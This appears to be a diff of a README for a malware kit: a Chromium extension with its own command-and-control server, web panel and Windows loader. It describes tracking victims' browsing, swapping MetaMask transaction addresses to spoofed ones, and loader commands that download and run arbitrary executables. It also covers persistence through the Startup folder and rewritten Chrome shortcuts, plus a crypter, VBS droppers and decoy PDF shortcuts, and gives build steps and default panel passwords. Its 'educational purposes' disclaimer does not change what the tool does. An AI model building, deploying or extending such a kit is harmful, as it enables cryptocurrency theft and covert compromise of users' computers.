@@ -1,120 +1,178 @@
-**Chromium extension, a separate C2 with a web panel for it. Loader for extension, works with separate C2 + web panel, can work without extension by executing commands and locking into the system.** 
-Read more about the components: 
-1. extension 
-2. loader
-3. loaderPanel - panel and server for loader 
-4. scrypt - additional utilities 
-5. server - server and panel for extension 
+# Chromium Extension C2 Suite
 
-**Each section has a readme describing how it works** 
+> **Chromium extension, a separate C2 with a web panel for it.  
+> Loader for the extension that works with the separate C2 + web panel,  
+> and can also work *without* the extension by executing commands and locking into the system.**
 
-## Extension server:
-**Authorization data**
-log - admin
-pass - password
+---
 
-**Device Tracker** 
-Display statistics of connected devices: 
-Statistics of connected devices: 
-- Status (online/offline)
-- Identifie(device tag)
-- URL of the active tab 
-- Title 
-- Timestamp 
-**MetaMask Override**
-Enter 10 preset values for swap (configmeta.json)
- Output log table of successful swap: 
-- Device Status 
-- Override Address (spoofed address where the transaction went)
-- Timestamp
-**Extension Panel**
-- Real-time randomizer value output (displayed to the user regardless of whether it was swapped or not).
-- Possibility to enter preset values by groups 
-- Displaying the history of randomizer swapping 
-- Display of the last generated number 
-**Settings**
-- Changing login and password of authorization in the panel (stored in configpass.json)
+## 📦 Components
 
-## Loader build//C2 loader:
-**Commands for the installer** 
-- restart_chrome - Restarts Chrome for the victim 
-- update_extension - Loads a new extension and removes the old one.
-- delete - Deletes itself completely and all temporary files and records 
-- load_and_run - Loads any file into the system and executes it 
+1. **extension** – browser extension itself  
+2. **loader** – installer/agent that deploys the extension and executes commands  
+3. **loaderPanel** – server + web panel that control the loader  
+4. **scrypt** – additional utilities  
+5. **server** – server + web panel that control the extension  
 
-Auth: 
-1. Login: admin 
-2. Password: admin 
+> *Each directory above has its own `README.md` describing the internals.*
 
-#MongoDB - Database for data storage #
-**Home**
-- Filtering by Online/Offline and searching the database by device ID
-- Enter device ID and select command
-- Display device list 
-- Display command and device history
-**Configuration** 
-- Ability to edit Ulr Lock and Url Unlock for Xlock page
+---
 
-#### Build Windows - loadWin loader for Windows 
-  - Architecture x64.
-  - Uses Windows libraries: winshell, shutil.
-  - Create autorun via shortcuts in Startup folder.
-  - Restart Chrome using .bat file. 
-  - Recursively search for all Chrome shortcuts and overwrite them.
-  - Working with temporary files via %TEMP%.
+## 🌐 Extension Server (`server/`)
 
-*Built-in build obfuscator in plans needs to be finalized*
-Build build: 
-1. Installing PyInstaller: 
+### Authorization Data
+
+- login: admin
+- pass : password
+
+### Device Tracker
+
+Displays statistics of connected devices:
+
+* **Status** (online / offline)
+* **Identifier** (device tag)
+* **URL** of the active tab
+* **Title** of the active tab
+* **Timestamp**
+
+### MetaMask Override
+
+1. Specify **10 preset swap values** in `configmeta.json`.
+2. Successful swaps are logged in a table showing:
+
+   * Device **Status**
+   * **Override Address** (spoofed destination)
+   * **Timestamp**
+
+### Extension Panel
+
+* Real-time **randomizer** output (shown to the user whether or not it was swapped)
+* Enter preset values **by groups**
+* View **history** of randomizer swaps
+* See the **last generated number**
+
+### Settings
+
+Change the panel’s login/password (stored in `configpass.json`).
+
+---
+
+## 🖥️ Loader Build / C2 Loader (`loader/`)
+
+### Installer Commands
+
+* `restart_chrome` — Restart Chrome on the victim
+* `update_extension` — Load a new extension, remove the old one
+* `delete` — Remove itself and all temp data completely
+* `load_and_run` — Download any file and execute it
+
+### Auth Credentials
+
+```text
+login : admin
+password: admin
+```
+
+### MongoDB (data storage)
+
+| Section           | Features                                                                                                               |
+| ----------------- | ---------------------------------------------------------------------------------------------------------------------- |
+| **Home**          | Filter *Online / Offline*, search by **Device ID**<br>Send commands to a specific device<br>View device list & history |
+| **Configuration** | Edit **Url Lock** / **Url Unlock** for Xlock page                                                                      |
+
+---
+
+## 🪟 Build Windows – `loadWin` (x64)
+
+* Uses `winshell`, `shutil`
+* Creates **autorun** shortcut in *Startup*
+* Restarts Chrome via `.bat`
+* Recursively finds every Chrome shortcut and overwrites it
+* Works with temp files in `%TEMP%`
+
+> *Built-in obfuscator is planned but not finalized.*
+
+### Build Steps
+
+```bash
+# 1 – Install PyInstaller
 pip install pyinstaller
 
-2. Building the EXE file: 
-pyinstaller --onefile --add-data “extension;extension” loadwin.py
+# 2 – Build executable
+pyinstaller --onefile --add-data "extension;extension" loadwin.py
+```
 
-- The --add-data “extension;extension” parameter adds the extension folder to the build.
-- After the build, the file loadwin.exe will appear in the dist folder.
-- Install all dependencies before building 
+* `--add-data "extension;extension"` embeds the **extension** directory.
+* Output: `dist/loadwin.exe`
+* **Install all dependencies first!**
 
-Use the name loadwin.py / load.py / loader.py depending on your purpose. 
-- loadwin.py is a full-fledged version that is installed on the system, loads the extension into chrome, waits for commands from the server and executes them.
-- loader.py - the version where the extension is installed in chrome, connects to the server and executes only the restart command. 
-- load.py - full analog of loadwin.py except for the warming in the system, installs the extension and waits for all commands from the server and executes them. 
-- The sample build is located /scrypt/exe 
-For efficient operation requires admin rights, without them works unstable. 
+### File Variants
 
-Functionality: 
-1. At first startup, the build copies the extension folder to %APPDATA%\.hidden_extension\extension, if there is no copy there yet.
+| Script         | Purpose                                                                |
+| -------------- | ---------------------------------------------------------------------- |
+| `loadwin.py`   | Full version: installs in system, loads extension, awaits all commands |
+| `loader.py`    | Installs extension **only** and handles `restart_chrome`               |
+| `load.py`      | Same as `loadwin.py` *except* no persistence on disk                   |
+| *Sample build* | See `scrypt/exe/`                                                      |
 
-2. Creates a shortcut in the autoloader folder (%AppData%\Microsoft\Windows\Start Menu\Programs\Startup) so that it will start automatically again every time you log in.
+> **Requires admin rights** for stability – runs, but unreliably, without them.
 
-3. searches for Google Chrome.lnk or Chrome.lnk files on the desktop and in the Start menu and Taskbar. If the shortcut points to chrome.exe, passes the --load-extension=“extension path” parameter to it.
+### Runtime Functionality
 
-4. Kills all Chrome processes (taskkill), waits for 3 minutes and launches chrome again with the updated shortcut via a temporary .bat.
+1. **First run:** copies extension to `%APPDATA%\.hidden_extension\extension` if absent.
+2. Adds shortcut to *Startup* (`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`).
+3. Locates every `Chrome.lnk` and adds `--load-extension="…"` to the target.
+4. Kills *all* Chrome processes, waits 3 min, re-launches Chrome via temp `.bat`.
+5. Polls the server every **30 s** for commands:
 
-5. Requests the server every 30 seconds, receiving commands:
-     - restart_chrome - updates shortcuts and restarts Chrome.  
-     - load_and_run - downloads the .exe to a temporary folder and runs it.  
-     - update_extension - downloads the .zip, replaces the old extension and restarts Chrome again.  
-     - delete - removes the extension, the autoload shortcut, and the .exe itself (via .bat).
+   * `restart_chrome` — update shortcuts & restart
+   * `load_and_run` — download `.exe` to temp & run
+   * `update_extension` — download `.zip`, replace extension, restart
+   * `delete` — remove extension, autostart shortcut, and the agent itself
+6. `delete` also kills Chrome and wipes the hidden extension folder.
 
-6. The delete command kills Chrome, deletes the hidden folder with the extension, removes the autoloader and deletes the .exe itself via .bat.
+---
 
-Create a standard package.json: npm init -y
-Install the npm-check module: npm install -g npm-check
-Install missing dependencies: npm-check --install
-Check command: npm-check --install
-Start the server: npm start
-Panel Url: http://localhost/ 
-MonroDB is used, install monrodb compass
-## Full pack scripts: 
-- Cvbs is a set of different vbs modifications that download and run install.vbs on different versions of win. 
-- DropDemo is a demo version of the crypter for load.exe (installer).
-- exe is a build of a ready load.exe, script on py + extensions are packed into one exe and the output is load.exe installer. 
-- lnk is a script to automatically create lnk that opens pdf and runs install.vbs to load and silently run load.exe 
-- loadermac is the macOS version of the installer, demo version in progress, requires admin password.
+## 🚀 Quick Start (LoaderPanel)
+
+```bash
+# Init Node project
+npm init -y
+
+# Install npm-check globally
+npm install -g npm-check
+
+# Install missing deps
+npm-check --install
+
+# Verify
+npm-check --install
+
+# Run
+npm start
+# Panel URL
+# http://localhost/
+```
+
+Uses **MongoDB** – recommended GUI: *MongoDB Compass*.
+
+---
+
+## 🗃️ Full Pack Scripts (`scrypt/`)
+
+| Folder      | Description                                                                |
+| ----------- | -------------------------------------------------------------------------- |
+| `Cvbs`      | VBS mods that download & run `install.vbs` on various Windows versions     |
+| `DropDemo`  | Demo crypter for `load.exe`                                                |
+| `exe`       | Pre-built `load.exe` (Python + extension packed)                           |
+| `lnk`       | Auto-creates a shortcut that opens a PDF *and* runs `install.vbs` silently |
+| `loadermac` | macOS installer (demo, WIP, requires admin password)                       |
+
+---
 
 ## 🚫 Disclaimer
 
-This repository is provided for **educational purposes only** and intended for **authorized security research**.
-Use of these materials in unauthorized or illegal activities is **strictly prohibited**.
+> This repository is provided for **educational purposes only** and intended for **authorized security research**.
+> **Unauthorized or illegal use is strictly prohibited.**
+
 
